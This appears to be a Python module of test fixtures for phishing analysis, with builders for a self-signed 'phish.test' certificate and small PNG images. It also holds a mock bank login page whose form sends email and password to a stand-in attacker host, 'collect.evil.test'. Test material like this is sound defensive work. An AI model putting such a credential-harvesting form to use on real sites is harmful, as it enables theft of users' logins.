"""Builders for offline test artefacts (certificates, images, pages)."""

from __future__ import annotations

import datetime as dt
import io

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID
from PIL import Image, ImageDraw


def self_signed_der(
    common_name: str = "phish.test", sans: tuple[str, ...] = ("phish.test", "login.phish.test")
) -> bytes:
    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name(
        [
            x509.NameAttribute(NameOID.COMMON_NAME, common_name),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Test Org"),
        ]
    )
    now = dt.datetime.now(dt.UTC)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - dt.timedelta(days=1))
        .not_valid_after(now + dt.timedelta(days=89))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(s) for s in sans]), critical=False)
        .sign(key, hashes.SHA256())
    )
    return cert.public_bytes(serialization.Encoding.DER)


def png_bytes(color: tuple[int, int, int] = (200, 30, 30), size: int = 32, mark: bool = True) -> bytes:
    img = Image.new("RGB", (size, size), color)
    if mark:
        draw = ImageDraw.Draw(img)
        draw.rectangle((size // 4, size // 4, size // 2, size // 2), fill=(255, 255, 255))
    out = io.BytesIO()
    img.save(out, format="PNG")
    return out.getvalue()


PHISH_HTML = """<!doctype html><html><head>
<title>Contoso Bank - Secure Login</title>
<link rel="icon" href="/static/fav.png">
<meta name="description" content="Sign in to your Contoso account">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC123XYZ9"></script>
<script>gtag('config', 'UA-1234567-1'); fbq('init', '123456789012345');</script>
</head><body>
<img src="/img/contoso-logo.png" alt="Contoso logo">
<form action="https://collect.evil.test/post.php" method="post">
<input type="email" name="email" placeholder="Email"><input type="password" name="password">
<button>Verify account</button></form></body></html>"""
